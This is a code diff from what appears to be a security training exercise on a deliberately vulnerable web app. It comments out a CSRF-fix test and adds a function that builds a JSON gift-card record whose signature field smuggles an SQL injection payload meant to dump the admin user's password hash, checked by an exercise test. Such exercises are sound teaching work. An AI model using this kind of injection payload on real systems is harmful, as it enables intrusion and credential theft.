@@ -229,8 +229,39 @@ def fix_csrf_vulnerability():
     with open('LegacySite/views.py', 'w') as f:
         f.write(x)
 
-from w2d4_test import test_fix_csrf_vulnerability
-print("\nTesting CSRF vulnerability fix...")
-test_fix_csrf_vulnerability(fix_csrf_vulnerability)
+# from w2d4_test import test_fix_csrf_vulnerability
+# print("\nTesting CSRF vulnerability fix...")
+# test_fix_csrf_vulnerability(fix_csrf_vulnerability)
 
 # %%
+
+def exploit_sql_injection_vulnerability():
+    """
+    Create SQL injection payload for card signature processing.
+
+    Args:
+        None
+
+    Returns:
+        bytes: JSON-encoded card data with malicious SQL injection payload to reveal admin password hash
+    """
+    new_card = {
+        "merchant_id": "GPT-4 API Credits",
+        "customer_id": "test@test.com",
+        "total_value": "1",
+        "records": [
+            {
+                "record_type": "amount_change",
+                "amount_added": 2000,
+                "signature": "74891960f9ab25d407967c106ddf4093'); SELECT * FROM LegacySite_user WHERE username = 'admin'; --",
+            }
+        ],
+    }
+    res = json.dumps(new_card, indent=2).encode('utf-8')
+    return res
+
+
+from w2d4_test import test_exploit_sql_injection_vulnerability
+
+
+test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability)
